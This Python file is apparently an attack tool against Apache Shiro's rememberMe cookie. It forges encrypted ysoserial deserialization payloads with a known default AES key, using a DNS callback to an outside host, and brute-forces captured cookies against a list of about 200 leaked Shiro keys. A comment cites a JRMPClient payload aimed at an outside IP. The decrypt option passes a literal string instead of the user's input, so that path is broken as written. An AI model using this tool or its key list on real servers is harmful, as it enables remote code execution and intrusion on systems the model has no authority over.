# -*- coding: utf-8 -*-
# @Author  : ninefighter
# @Time    : 2020/09/13
# @Function: shiroAESDecrypt

import uuid
import base64
import subprocess
from Crypto.Cipher import AES
import optparse
import sys


# list1 = []
class shiroAesTools:
    def __init__(self):
        BS = AES.block_size  # aes数据分组长度为128 bit  16
        self.pad = lambda s: s + (
            (BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()  # padding算法

    def encode_rememberme(self, command):
        popen1 = subprocess.Popen(
            ['java', '-jar', 'ysoserial7.jar', 'URLDNS', command],
            stdout=subprocess.PIPE)
        key = base64.b64decode("5aaC5qKm5oqA5pyvAAAAAA==")
        iv = uuid.uuid4().bytes  # 生成一个随机的UUID
        mode = AES.MODE_CBC
        encryptor = AES.new(key, mode, iv)
        res = popen1.stdout.read()
        file_body = self.pad(
            res
        )  # pad('java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient 118.25.69.**:6666')
        base64_ciphertext = base64.b64encode(
            iv + encryptor.encrypt(file_body))  # 使用密钥进行AES加密 Base64加密
        print('rememberme=%s' % base64_ciphertext, '\n')
        return base64_ciphertext

    # remember Me加密内容 ---> Base64解密 ---> 使用密钥进行AES解密 --->Java反序列化
    def decode_rememberme(self, payload):
        result = []
        keylist = [
            '0AvVhmFLUs0KTA3Kprsdag==',
'1AvVhdsgUs0FSA3SDFAdag==',
'1QWLxg+NYmxraMoxAXu/Iw==',
'1tC/xrDYs8ey+sa3emtiYw==',
'25BsmdYwjnfcWmnhAciDDg==',
'2A2V+RFLUs+eTA3Kpr+dag==',
'2adsfasdqerqerqewradsf==',
'2AvVCXsxUs0FSA7SYFjdQg==',
'2AvVhdsgERdsSA3SDFAdag==',
'2AvVhdsgUs0FSA3SaFAdfg==',
'2AvVhdsgUs0FSA3SDFAdag==',
'2AvVhdsgUs0FSA3SDFAder==',
'2AvVhdsgUsOFSA3SDFAdag==',
'2AvVhmFLUs0KTA3Kprsdag==',
'2AvVidsaUSofSA3SDFAdog==',
'2cVtiE83c4lIrELJwKGJUw==',
'2itfW92XazYRi5ltW0M2yA==',
'3Av2hmFLAs0BTA3Kprsd6E==',
'3AvVhdAgUs0FSA4SDFAdBg==',
'3AvVhdAgUs1FSA4SDFAdBg==',
'3AvVhMFLIs0KTA3Kprsdag==',
'3AvVhmFLUs0KTA3KaTHGFg==',
'3AvVhmFLUs0KTA3Kprsdag==',
'3JvYhmBLUs0ETA5Kprsdag==',
'3qDVdLawoIr1xFd6ietnsg==',
'3qDVdLawoIr1xFd6ietnwg==',
'3rvVhmFLUs0KAT3Kprsdag==',
'4AvVhdsgUs0F563SDFAdag==',
'4AvVhm2LUs0KTA3Kprsdag==',
'4AvVhmFLUs0KTA3KAAAAAA==',
'4AvVhmFLUs0KTA3Kprsdag==',
'4AvVhmFLUs0KTA3Kprseaf==',
'4AvVhmFLUs0TTA3Kprsdag==',
'4AvVhmFLUs5KTA1Kprsdag==',
'4AvVhmFLUsOKTA3Kprsdag==',
'4BvVhmFLUs0KTA3Kprsdag==',
'4rvVhmFLUs0KAT3Kprsdag==',
'4WCZSJyqdUQsije93aQIRg==',
'5aaC5qKm5oqA5pyvAAAAAA==',
'5AvVhCsgUs0FSA3SDFAdag==',
'5AvVhmFLUS0ATA4Kprsdag==',
'5AvVhmFLUs0KTA3Kprsdag==',
'5J7bIJIV0LQSN3c9LPitBQ==',
'5oiR5piv5p2h5ZK46bG8IQ==',
'5RC7uBZLkByfFfJm22q/Zw==',
'66v1O8keKNV3TTcGPK1wzg==',
'6AvVhmFLUs0KTA3Kprsdag==',
'6NfXkC7YVCV5DASIrEm1Rg==',
'6Zm+6I2j5Y+R5aS+5ZOlAA==',
'6ZmI6I2j3Y+R1aSn5BOlAA==',
'6ZmI6I2j5Y+R5aSn5ZOlAA==',
'7AvVhmFLUs0KTA3Kprsdag==',
'8AvVhdsgUs0FSA3SDFAdag==',
'8AvVhmFLUs0KTA3Kprsdag==',
'8BvVhmFLUs0KTA3Kprsdag==',
'9Ami6v2G5Y+r5aPnE4OlBB==',
'9AvVhmFLUs0KTA3Kprsdag==',
'9AVvhnFLuS3KTV8KprsdAg==',
'9FvVhtFLUs0KnA3Kprsdyg==',
'a2VlcE9uR29pbmdBbmRGaQ==',
'a3dvbmcAAAAAAAAAAAAAAA==',
'A7UzJgh1+EWj5oBFi+mSgw==',
'AF05JAuyuEB1ouJQ9Y9Phg==',
'aG91c2Vob3VzZWhvdXNlMg==',
'A+kWR7o9O0/G/W6aOGesRA==',
'aU1pcmFjbGVpTWlyYWNsZQ==',
'AztiX2RUqhc7dhOzl1Mj8Q==',
'b2EAAAAAAAAAAAAAAAAAAA==',
'B9rPF8FHhxKJZ9k63ik7kQ==',
'Bf7MfkNR0axGGptozrebag==',
'bWljcm9zAAAAAAAAAAAAAA==',
'bWluZS1hc3NldC1rZXk6QQ==',
'bXdrXl9eNjY2KjA3Z2otPQ==',
'bXRvbnMAAAAAAAAAAAAAAA==',
'bya2HkYo57u6fWh5theAWw==',
'c2hpcm9fYmF0aXMzMgAAAA==',
'c2hvdWtlLXBsdXMuMjAxNg==',
'c+3hFGPjbgzGdrC+MHgoRQ==',
'cGhyYWNrY3RmREUhfiMkZA==',
'cGljYXMAAAAAAAAAAAAAAA==',
'Cj6LnKZNLEowAZrdqyH/Ew==',
'ClLk69oNcA3m+s0jIMIkpg==',
'cmVtZW1iZXJNZQAAAAAAAA==',
'd2ViUmVtZW1iZXJNZUtleQ==',
'duhfin37x6chw29jsne45m==',
'empodDEyMwAAAAAAAAAAAA==',
'ertVhmFLUs0KTA3Kprsdag==',
'eXNmAAAAAAAAAAAAAAAAAA==',
'fcq+/xW488hMTCD+cmJ3aq==',
'fCq+/xW488hMTCE+cmJ3FF==',
'fdCEiK9YvLC668sS43CJ6A==',
'FjbNm1avvGmWE9CY2HqV75==',
'FJoQCiz0z5XWz2N2LyxNww==',
'FL9HL9Yu5bVUJ0PDU1ySvg==',
'FP7qKJzdJOGkzoQzo2wTmA==',
'fsHspZw/92PrS3XrPW+vxw==',
'f/SY5TIve5WWzT4aQlABJA==',
'GAevYnznvgNCURavBhCr1w==',
'GhrF5zLfq1Dtadd1jlohhA==',
'GHxH6G3LFh8Zb3NwoRgfFA==',
'GsHaWo4m1eNbE0kNSMULhg==',
'hBlzKg78ajaZuTE0VLzDDg==',
'HeUZ/LvgkO7nsa18ZyVxWQ==',
'HOlg7NHb9potm0n5s4ic0Q==',
'HoTP07fJPKIRLOWoVXmv+Q==',
'HWrBltGvEZc14h9VpMvZWw==',
'i45FVt72K2kLgvFrJtoZRw==',
'IduElDUpDDXE677ZkhhKnQ==',
'Is9zJ3pzNh2cgTHB4ua3+Q==',
'iycgIIyCatQofd0XXxbzEg==',
'Jt3C93kMR9D5e8QzwfsiMw==',
'kPH+bIxk5D2deZiIxcaaaA==',
'kPH+bIxk5D2deZiIxcabaA==',
'kPH+bIxk5D2deZiIxcacaA==',
'KU471rVNQ6k7PQL4SqxgJg==',
'L7RioUULEFhRyxM7a2R/Yg==',
'l8cc6d2xpkT1yFtLIcLHCg==',
'lt181dcQVz/Bo9Wb8ws/Cg==',
'lT2UvDUmQwewm6mMoiw4Ig==',
'm0/5ZZ9L4jjQXn7MREr/bw==',
'M2djA70UBBUPDibGZBRvrA==',
'mIccZhQt6EBHrZIyw1FAXQ==',
'MPdCMZ9urzEA50JDlDYYDg==',
'MTIzNDU2Nzg5MGFiY2RlZg==',
'MTIzNDU2NzgxMjM0NTY3OA==',
'MzVeSkYyWTI2OFVLZjRzZg==',
'NGk/3cQ6F5/UNPRh8LpMIg==',
'NoIw91X9GSiCrLCF03ZGZw==',
'NsZXjXVklWPZwOfkvk6kUA==',
'O4pdf+7e+mZe8NyxMTPJmQ==',
'oPH+bIxk5E2enZiIxcqaaA==',
'OUHYQzxQ/W9e/UjiAGu6rg==',
'OY//C4rhfwNxCQAQCrQQ1Q==',
'pbnA+Qzen1vjV3rNqQBLHg==',
'pyyX1c5x2f0LZZ7VKZXjKO==',
'Q01TX0JGTFlLRVlfMjAxOQ==',
'QAk0rp8sG0uJC4Ke2baYNA==',
'QDFCnfkLUs0KTA3Kprsdag==',
'QF5HMyZAWDZYRyFnSGhTdQ==',
'qQFtSnnj/sx7vu51ixAyEQ==',
'QUxQSEFNWVNPRlRCVUlMRA==',
'QVN1bm5uJ3MgU3Vuc2l0ZQ==',
'r0e3c16IdVkouZgk1TKVMg==',
'R29yZG9uV2ViAAAAAAAAAA==',
'Rb5RN+LofDWJlzWAwsXzxg==',
'rPNqM6uKFCyaL10AK51UkQ==',
'RVZBTk5JR0hUTFlfV0FPVQ==',
's0KTA3mFLUprK4AvVhsdag==',
's2SE9y32PvLeYo+VGFpcKA==',
'sBv2t3okbdm3U0r2EVcSzB==',
'SDKOLKn2J1j/2BHjeZwAoQ==',
'sgIQrqUVxa1OZRRIK3hLZw==',
'sHdIjUN6tzhl8xZMG3ULCQ==',
'SkZpbmFsQmxhZGUAAAAAAA==',
'SrpFBcVD89eTQ2icOD0TMg==',
'TGMPe7lGO/Gbr38QiJu1/w==',
'tiVV6g3uZBGfgshesAQbjA==',
'U0hGX2d1bnMAAAAAAAAAAA==',
'U3BAbW5nQmxhZGUAAAAAAA==',
'U3ByaW5nQmxhZGUAAAAAAA==',
'UGlzMjAxNiVLeUVlXiEjLw==',
'Us0KvVhTeasAm43KFLAeng==',
'V2hhdCBUaGUgSGVsbAAAAA==',
'vXP33AonIp9bFwGl7aT7rA==',
'w793pPq5ZVBKkj8OhV4KaQ==',
'WcfHGU25gNnTxTlmJMeSpw==',
'wGiHplamyXlVB11UXWol8g==',
'WkhBTkdYSUFPSEVJX0NBVA==',
'wrjUh2ttBPQLnT4JVhriug==',
'WuB+y2gcHRnY2Lg9+Aqmqg==',
'wyLZMDifwq3sW1vhhHpgKA==',
'XgGkgqGqYrix9lI6vxcrRw==',
'XTx6CKLo/SdSgub+OPHSrw==',
'xVmmoltfpb8tTceuT5R7Bw==',
'Y1JxNSPXVwMkyvES/kJGeQ==',
'yeAAo1E8BOeAYfBlm4NG9Q==',
'YI1+nBV//m7ELrIyDHm6DQ==',
'Ymx1ZXdoYWxlAAAAAAAAAA==',
'yNeUgSzL/CfiWw1GALg6Ag==',
'YnlhdnMAAAAAAAAAAAAAAA==',
'YVd4dmRtVjViM1UlM0QIdn==',
'YWdlbnRAZG1AMjAxOHN3Zg==',
'YWJjZGRjYmFhYmNkZGNiYQ==',
'YystomRZLMUjiK0Q1+LFdw==',
'Z3VucwAAAAAAAAAAAAAAAA==',
'Z3VucwAAAAAAAAAAAAABBB==',
'Z3VucwACAOVAKALACAADSA==',
'ZAvph3dsQs0FSL3SDFAdag==',
'ZGdmdwAAAAAAAAAAAAAAAA',
'zIiHplamyXlVB11UXWol8g==',
'ZjQyMTJiNTJhZGZmYjFjMQ==',
'ZmFsYWRvLnh5ei5zaGlybw==',
'ZnJlc2h6Y24xMjM0NTY3OA==',
'zSyK5Kp6PZAAjlT+eeNMlg==',
'ZUdsaGJuSmxibVI2ZHc9PQ==',
'ZUdsaGJuSmxibVI2ZHc9PQ==',
'k3+XHEg6D8tb2mGm7VJ3nQ==',
'3AvVhmFLUs0KTA3Kprsdag=='
        ]
        for key in keylist:
            try:
                mode = AES.MODE_CBC
                tmp = base64.b64decode(payload)
                IV = tmp[:
                         16]  # shiro利用arraycopy()方法将随机的16字节IV放到序列化后的数据前面,取前16字节作为iv
                encryptor = AES.new(base64.b64decode(key), mode, IV=IV)
                remember_bin = encryptor.decrypt(tmp[16:])
                if b"java" in remember_bin:
                    result.append(remember_bin)
                    print("检测到key: %s" % key)
                # remember_bin = remember_bin.decode('unicode-escape')
            except Exception as e:
                continue
        return result

    def params(self):
        parser = optparse.OptionParser(
            'usage: %prog [options]\n'
            'Example: python3 %prog -d \'Cookie-remeberMe\'')
        parser.add_option('-d',
                          '--decrypt',
                          dest='payload',
                          type='string',
                          help='remeberMe的payload')
        parser.add_option('-e',
                          '--encrypt',
                          dest='command',
                          type='string',
                          help='dnslog地址')
        (options, args) = parser.parse_args()
        if ((len(sys.argv) <= 1) | (not(options))):
            parser.print_help()
            sys.exit(0)
        elif options.payload:
            if options.command:
                parser.print_help()
                sys.exit(0)
            else:
                print("*****************解密*****************")
                res = self.decode_rememberme("options.payload")
                print(res)
        elif options.command:
            print("*****************生成*****************")
            self.encode_rememberme(options.command)

if __name__ == '__main__':
    tools = shiroAesTools()
    tools.params()
